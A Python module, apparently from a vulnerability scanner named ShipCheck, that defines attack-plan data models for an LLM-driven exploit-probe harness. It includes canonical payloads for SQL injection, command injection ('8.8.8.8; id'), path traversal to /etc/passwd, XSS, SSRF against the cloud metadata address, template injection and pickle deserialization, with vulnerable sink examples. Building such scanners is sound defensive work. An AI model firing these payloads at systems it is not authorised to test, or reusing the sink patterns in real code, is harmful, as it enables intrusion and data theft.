"""Attack Plan Contract for ShipCheck.

Defines the structure produced by the planning stage (Ultra model)
instructing the probe harness how to construct and execute an exploit attempt
against a candidate vulnerability found during triage.

JSON Shape:
    {
        "vuln_class": "sqli",
        "target_file": "app.py",
        "sink": "login()",
        "payload_strategy": "boolean bypass",
        "expected_marker": "multiple rows"
    }
"""

from __future__ import annotations

import uuid
from enum import Enum
from typing import Any, Dict, List, Optional
from pydantic import BaseModel, Field, field_validator


class VulnClass(str, Enum):
    """Supported vulnerability classes in ShipCheck."""
    SQLI = "sqli"               # SQL Injection (e.g. ' OR 1=1--)
    CMDI = "cmdi"               # OS Command Injection (e.g. ; id, 8.8.8.8; id)
    TRAVERSAL = "traversal"     # Path / Directory Traversal (e.g. ../../etc/passwd)
    XSS = "xss"                 # Reflected Cross-Site Scripting (e.g. <script>alert(1)</script>)
    SSRF = "ssrf"               # Server-Side Request Forgery (e.g. http://169.254.169.254/)
    SSTI = "ssti"               # Server-Side Template Injection (e.g. {{7*7}})
    IDOR = "idor"               # Insecure Direct Object Reference (e.g. accessing other tenant's object)
    DESERIALIZATION = "deserialization" # Insecure Deserialization (e.g. pickle/unsafe yaml)
    SECRETS = "secrets"         # Leaked credentials / keys (from gitleaks)
    DEPS = "deps"               # Vulnerable dependency CVE (from pip-audit/osv)
    OTHER = "other"             # Extensible placeholder


class AttackPlan(BaseModel):
    """The Attack Plan contract defining a single targeted exploit probe.
    
    Fields strictly implement:
        {vuln_class, target_file, sink, payload_strategy, expected_marker}
    along with operational metadata for sandbox routing and execution tracing.
    """
    plan_id: str = Field(
        default_factory=lambda: f"plan-{uuid.uuid4().hex[:12]}",
        description="Unique identifier for tracking this plan across probes and reports"
    )
    vuln_class: VulnClass = Field(
        ...,
        description="The vulnerability classification being targeted (sqli, cmdi, traversal, xss)"
    )
    target_file: str = Field(
        ...,
        description="Relative file path containing the vulnerable sink (e.g. app.py)"
    )
    sink: str = Field(
        ...,
        description="The dangerous code sink or function call (e.g. login(), db.execute(), os.system())"
    )
    payload_strategy: str = Field(
        ...,
        description="High-level strategy used for exploit generation (e.g. boolean bypass, command chaining)"
    )
    expected_marker: str = Field(
        ...,
        description="Deterministic string or token whose presence in response proves exploit success (e.g. root:, uid=)"
    )
    
    # Extended execution fields to make the plan actionable by probes/harness.py
    route: Optional[str] = Field(
        default=None,
        description="HTTP route or CLI command entrypoint (e.g. /login, /api/ping)"
    )
    http_method: str = Field(
        default="POST",
        description="HTTP method to use if probing an HTTP endpoint (GET, POST, PUT, etc.)"
    )
    parameter_name: Optional[str] = Field(
        default=None,
        description="Target input parameter name (e.g. username, host, filename, q)"
    )
    suggested_payload: Optional[str] = Field(
        default=None,
        description="Concrete candidate payload provided by LLM planner (e.g. ' OR 1=1--)"
    )
    headers: Dict[str, str] = Field(
        default_factory=dict,
        description="Custom HTTP headers needed for probe dispatch"
    )
    rationale: Optional[str] = Field(
        default=None,
        description="Planner model reasoning explaining why this sink is reachable and exploitable"
    )

    @field_validator("vuln_class", mode="before")
    @classmethod
    def normalize_vuln_class(cls, v: Any) -> VulnClass:
        if isinstance(v, VulnClass):
            return v
        if isinstance(v, str):
            val = v.strip().lower()
            # Map common alternative aliases
            alias_map = {
                "sql_injection": VulnClass.SQLI,
                "sql-injection": VulnClass.SQLI,
                "sqli": VulnClass.SQLI,
                "command_injection": VulnClass.CMDI,
                "command-injection": VulnClass.CMDI,
                "cmdi": VulnClass.CMDI,
                "os_command_injection": VulnClass.CMDI,
                "path_traversal": VulnClass.TRAVERSAL,
                "path-traversal": VulnClass.TRAVERSAL,
                "directory_traversal": VulnClass.TRAVERSAL,
                "traversal": VulnClass.TRAVERSAL,
                "lfi": VulnClass.TRAVERSAL,
                "cross_site_scripting": VulnClass.XSS,
                "cross-site-scripting": VulnClass.XSS,
                "xss": VulnClass.XSS,
                "reflected_xss": VulnClass.XSS,
                "secret": VulnClass.SECRETS,
                "secrets": VulnClass.SECRETS,
                "dependency": VulnClass.DEPS,
                "deps": VulnClass.DEPS,
                "ssrf": VulnClass.SSRF,
                "server_side_request_forgery": VulnClass.SSRF,
                "server-side-request-forgery": VulnClass.SSRF,
                "ssti": VulnClass.SSTI,
                "template_injection": VulnClass.SSTI,
                "template-injection": VulnClass.SSTI,
                "server_side_template_injection": VulnClass.SSTI,
                "idor": VulnClass.IDOR,
                "bola": VulnClass.IDOR,
                "broken_object_level_authorization": VulnClass.IDOR,
                "broken-object-level-authorization": VulnClass.IDOR,
                "deserialization": VulnClass.DESERIALIZATION,
                "insecure_deserialization": VulnClass.DESERIALIZATION,
                "insecure-deserialization": VulnClass.DESERIALIZATION,
                "unsafe_deserialization": VulnClass.DESERIALIZATION,
                "pickle": VulnClass.DESERIALIZATION,
            }
            if val in alias_map:
                return alias_map[val]
            for member in VulnClass:
                if member.value == val:
                    return member
        return VulnClass.OTHER

    @field_validator("target_file", "sink", "payload_strategy", "expected_marker")
    @classmethod
    def non_empty_string(cls, v: str) -> str:
        s = v.strip()
        if not s:
            raise ValueError("Field cannot be empty")
        return s


class AttackPlanBatch(BaseModel):
    """Collection of attack plans for a scan run."""
    batch_id: str = Field(
        default_factory=lambda: f"batch-{uuid.uuid4().hex[:12]}"
    )
    diff_ref: Optional[str] = Field(
        default=None,
        description="Git commit hash or PR number associated with this plan batch"
    )
    plans: List[AttackPlan] = Field(
        default_factory=list,
        description="List of planned probe attacks"
    )


# Canonical fallback templates for the 4 core vulnerability classes
# PRoject.txt note: "Template the four exploit payloads. The payloads are fixed strings,
# so use parameterized scripts per class instead of having an LLM write each PoC."
CANONICAL_ATTACK_TEMPLATES: Dict[VulnClass, Dict[str, Any]] = {
    VulnClass.SQLI: {
        "payload_strategy": "boolean authentication bypass",
        "default_payload": "' OR 1=1--",
        "expected_marker": "admin",
        "sink_example": "db.execute(f\"SELECT * FROM users WHERE name='{name}' AND pw='{pw}'\")",
        "description": "SQL Injection bypassing auth query predicate to return administrative records"
    },
    VulnClass.CMDI: {
        "payload_strategy": "command chaining via shell separator",
        "default_payload": "8.8.8.8; id",
        "expected_marker": "uid=",
        "sink_example": "os.system(\"ping -c 1 \" + host)",
        "description": "OS Command injection appending POSIX id command to leak current user context"
    },
    VulnClass.TRAVERSAL: {
        "payload_strategy": "dot-dot-slash directory traversal",
        "default_payload": "../../etc/passwd",
        "expected_marker": "root:",
        "sink_example": "open(os.path.join(BASE_DIR, filename))",
        "description": "Path traversal escaping base directory to read system account file"
    },
    VulnClass.XSS: {
        "payload_strategy": "unencoded script tag injection",
        "default_payload": "<script>alert(1)</script>",
        "expected_marker": "<script>alert(1)</script>",
        "sink_example": "return f\"<h1>Results for {q}</h1>\"",
        "description": "Reflected XSS reflecting user input directly without HTML entity encoding"
    },
    VulnClass.SSRF: {
        "payload_strategy": "cloud metadata service access via unvalidated URL parameter",
        "default_payload": "http://169.254.169.254/latest/meta-data/",
        "expected_marker": "ami-id",
        "sink_example": "requests.get(request.args.get('url'))",
        "description": "Server-Side Request Forgery forcing backend server to query link-local cloud metadata"
    },
    VulnClass.SSTI: {
        "payload_strategy": "template expression evaluation via math canary",
        "default_payload": "{{7*7}}",
        "expected_marker": "49",
        "sink_example": "jinja2.Template(f\"Hello {name}\").render()",
        "description": "Server-Side Template Injection evaluating mathematical expressions in template engine context"
    },
    VulnClass.IDOR: {
        "payload_strategy": "horizontal parameter tampering across tenant boundary",
        "default_payload": "102",
        "expected_marker": "owner_id: 102",
        "sink_example": "Order.query.filter_by(id=request.args.get('order_id')).first()",
        "description": "Insecure Direct Object Reference accessing foreign tenant record without authorization check"
    },
    VulnClass.DESERIALIZATION: {
        "payload_strategy": "arbitrary object instantiation via unsafe pickle bytecode stream",
        "default_payload": "cos\\nsystem\\n(S'id'\\ntR.",
        "expected_marker": "uid=",
        "sink_example": "pickle.loads(base64.b64decode(user_cookie))",
        "description": "Insecure Deserialization executing arbitrary system commands during bytecode unpickling"
    },
}
